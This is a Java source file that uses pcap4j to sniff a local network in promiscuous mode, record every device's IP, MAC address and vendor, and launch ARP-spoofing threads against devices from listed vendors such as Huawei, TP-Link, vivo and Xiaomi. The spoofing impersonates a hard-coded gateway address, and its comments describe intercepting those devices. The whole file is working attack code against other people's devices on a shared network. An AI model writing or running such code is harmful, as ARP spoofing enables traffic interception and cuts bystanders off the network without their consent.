package com.rbac.demo.pcap4j;
import com.rbac.demo.entity.Oui;
import com.rbac.demo.entity.ScanInfo;
import com.rbac.demo.jpa.JpaFilter;
import com.rbac.demo.jpa.JpaOui;
import org.pcap4j.core.*;
import org.pcap4j.packet.*;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutorService;

/**
 *
 * 过滤并拦截局域网内特定厂商设备
 *
 *
 * */

public class FiltAllPacket {
    public  void filtAllPacket(JpaOui jpaOui, JpaFilter jpaFilter) throws PcapNativeException,NotOpenException, InterruptedException {
        List<ExecutorService> pools=new ArrayList<>();   //存储线程
        List<String> macs=new ArrayList<>();    //存储已经拦截的设备的mac地址，防止重复拦截
        InetAddress addr ;
        PcapNetworkInterface nif=null;
        List<Oui> ouiList=jpaOui.findAll();     //IEEE组织厂商mac地址对应表，已经读入数据库。通过jpa读出存入list备用
        final boolean[] flag = {false,false};   //标志
        try {
            addr = InetAddress.getByName("10.75.60.35");   //通过ip获得本机监听网卡
            nif = Pcaps.getDevByAddress(addr);             //生成PcapNetworkInterface对象
        } catch (UnknownHostException e) {
            e.printStackTrace();
        } catch (PcapNativeException e) {
            e.printStackTrace();
        }
        int snapLen = 65536;
        PcapNetworkInterface.PromiscuousMode mode = PcapNetworkInterface.PromiscuousMode.PROMISCUOUS;//混杂模式，具体作用不明
        int timeout = 20;
        PcapHandle handle = nif.openLive(snapLen, mode, timeout);   //打开接口获得handler
        handle.loop(-1, new PacketListener() {    //开启监听loop
            @Override
            public void gotPacket(PcapPacket pcapPacket) {   //监听数据包
                if(pcapPacket!=null){
                    IpV4Packet packets=pcapPacket.get(IpV4Packet.class);
                    EthernetPacket ethernetPacket=pcapPacket.get(EthernetPacket.class);
                    if(packets!=null){
                        /**
                         * 如果数据包是IPv4包，则继续。
                         *
                         * */
                        String hostAddress=packets.getHeader().getSrcAddr().getHostAddress();   //获得捕获数据包的源地址
                        if(hostAddress.contains("10.75")||hostAddress.contains("192.168")&&!hostAddress.equals("10.75.60.35")) {  //过滤数据包
                            String srcMacAddr="";
                            String ip="";
                            if(ethernetPacket.getHeader()!=null){
                                /**
                                 * 如果数据包的ethernet层不为空，则获取数据链路层的源mac地址
                                 *
                                 * */
                                srcMacAddr=ethernetPacket.getHeader().getSrcAddr().toString();
                                ip=hostAddress;
                            }
                            List<ScanInfo> scanInfos=jpaFilter.findAll();  //获得所有存储的数据包对象
                            flag[0] =false;
                            for(ScanInfo scanInf:scanInfos){
                                flag[1]=false;
                                if(scanInf.getMac().equals(srcMacAddr)){
                                    if(scanInf.getOuiByOuiId()==null){
                                        /**
                                         * 如果过滤到的数据包的mac地址在oui表里面找不到对应项则跳过
                                         *
                                         * */
                                        continue;
                                    }
                                    String info=scanInf.getOuiByOuiId().getComInfo();
                                    if (info.contains("HUAWEI") || info.contains("TP-LINK")
                                            || info.contains("vivo") || info.contains("Netcore") || info.contains("360")
                                            || info.contains("Tenda") || info.contains("Xiaomi")||info.contains("H3C")) {
                                        /**
                                         * 过滤华为、tp、腾达等设备
                                         *
                                         * */

                                        for (String string:macs){
                                            if(scanInf.getMac().equals(string)){
                                                /**
                                                 * 判断捕获的数据包是否已经被拦截，如果已经被拦截则跳过
                                                 *
                                                 * */
                                                flag[1]=true;
                                                break;
                                            }
                                        }
                                        if(flag[1]){
                                            continue;
                                        }
                                        ArpReply reply=new ArpReply();
                                        Map<String,String> map=new HashMap<>();
                                        map.put(ip,scanInf.getMac());
                                        try {

                                            /**
                                             * 使用createThread方法创建arp欺骗进程，map存储arp欺骗目标
                                             *
                                             * */
                                            System.out.println("开始进程"+scanInf.getMac());
                                            ExecutorService pool=reply.createThread(map,"6c:4b:90:8b:42:03", "10.75.60.1", "10.75.60.35");
                                            macs.add(scanInf.getMac());    //
                                            pools.add(pool);
                                        } catch (UnknownHostException e) {
                                            e.printStackTrace();
                                        } catch (PcapNativeException e) {
                                            e.printStackTrace();
                                        }
                                    }
                                    if(!scanInf.getIp().equals(ip)){
                                        scanInf.setIp(ip);
                                        jpaFilter.save(scanInf);
                                    }
                                    flag[0] =true;
                                    break;
                                }
                            }
                            if(!flag[0]){

                                /**
                                 * 如果扫描到的数据包没被存入数据库，则构建新对象存入数据库
                                 *
                                 * */
                                ScanInfo scanInfo=new ScanInfo();
                                scanInfo.setIp(packets.getHeader().getSrcAddr().getHostAddress());
                                scanInfo.setTtl(packets.getHeader().getTtlAsInt());
                                scanInfo.setMac(srcMacAddr);
                                for (Oui oui:ouiList){
                                    if(srcMacAddr.contains(oui.getMacHead())){
                                        scanInfo.setOuiByOuiId(oui);

                                        break;
                                    }
                                }
                                jpaFilter.save(scanInfo);
                            }
                        }
                    }
                }
            }
        });
        handle.close();
    }

}
